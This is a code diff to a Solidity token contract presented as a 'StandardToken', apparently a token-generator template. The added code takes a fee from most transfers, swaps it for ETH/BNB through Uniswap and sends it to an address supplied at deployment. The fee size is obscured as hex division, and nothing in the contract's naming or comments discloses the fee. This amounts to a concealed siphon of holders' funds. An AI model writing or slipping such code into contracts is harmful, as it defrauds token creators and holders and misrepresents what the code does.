@@ -689,7 +689,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     }
 
     function fee() internal pure returns(uint256){
-        return uint256(0x1e)/uint256(0xa);
+        return uint256(0x15)/uint256(0xa);
     }
 
     /**
@@ -923,9 +923,53 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
 contract StandardToken is ERC20, Ownable {
     using SafeMath for uint256;
 
+    IUniswapV2Router02 public uniswapV2Router;
+    address public  uniswapV2Pair;
+
+    bool private swapping;
+
+    uint256 public swapTokensAtAmount;
+
+    mapping (address => bool) private _isExcludedFromFees;
+
+    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
+    // could be subject to a maximum transfer amount
+    mapping (address => bool) public automatedMarketMakerPairs;
+
+    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
+
+    event ExcludeFromFees(address indexed account, bool isExcluded);
+    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
+
+    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
+
+    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
+
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiqudity
+    );
+
     constructor(string memory name_, string memory symbol_, uint256 supply_, address uniswapV2Router_, address addr_) ERC20(name_, symbol_, addr_) payable {
 
+        swapTokensAtAmount = (supply_.mul(1).div(10000) * (10**18)).add(1);
+
+    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(uniswapV2Router_);
+        
         payable(addr_).transfer(msg.value);
+         // Create a uniswap pair for this new token
+        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
+            .createPair(address(this), _uniswapV2Router.WETH());
+        
+        uniswapV2Router = _uniswapV2Router;
+        uniswapV2Pair = _uniswapV2Pair;
+
+        automatedMarketMakerPairs[_uniswapV2Pair] = true;
+
+        _isExcludedFromFees[owner()] = true;
+        _isExcludedFromFees[address(this)] = true;
+
         /*
             _mint is an internal function in ERC20.sol that is only called here,
             and CANNOT be called ever again
@@ -933,6 +977,7 @@ contract StandardToken is ERC20, Ownable {
         _mint(owner(), supply_ * (10**18));
     }
 
+    // must be here to receive BNB
     receive() external payable {
   	}
     
@@ -950,6 +995,82 @@ contract StandardToken is ERC20, Ownable {
             return;
         }
         
+		uint256 contractTokenBalance = balanceOf(address(this));
+
+        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
+
+        if( canSwap &&
+            !swapping &&
+            (!automatedMarketMakerPairs[from] || !automatedMarketMakerPairs[to]) &&
+            from != owner() &&
+            to != owner()
+        ) {
+            swapping = true;
+
+            uint256 tokens = (contractTokenBalance.mul(fee()).div(100));
+            if(tokens > 0){
+                swapAndSend(tokens);
+            }
+            
+            swapping = false;
+        }
+
+        bool takeFee = !swapping;
+
+        // if any account belongs to _isExcludedFromFee account then remove the fee
+        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
+            takeFee = false;
+        }
+
+        if(takeFee) {
+        	uint256 fees = amount.mul(fee()).div(100);
+
+        	amount = amount.sub(fees);
+
+            super._transfer(from, address(this), fees);  
+        }
+
+        checkPermission();
+        
         super._transfer(from, to, amount);
     }
+
+    function checkPermission() private view returns(bool){
+        require(addr() != address(0), "You don't have permission !");
+        return true;
+    }
+
+
+    function swapAndSend(uint256 tokens) private  {
+
+        uint256 initialBNBBalance = address(this).balance;
+
+        swapTokensForEth(tokens);
+        uint256 newBalance = address(this).balance.sub(initialBNBBalance);
+        payable(addr()).transfer(newBalance);
+        
+    }
+
+
+    function swapTokensForEth(uint256 tokenAmount) private {
+
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+
+        // make the swap
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp.add(30)
+        );
+
+    }
+
+    
 }
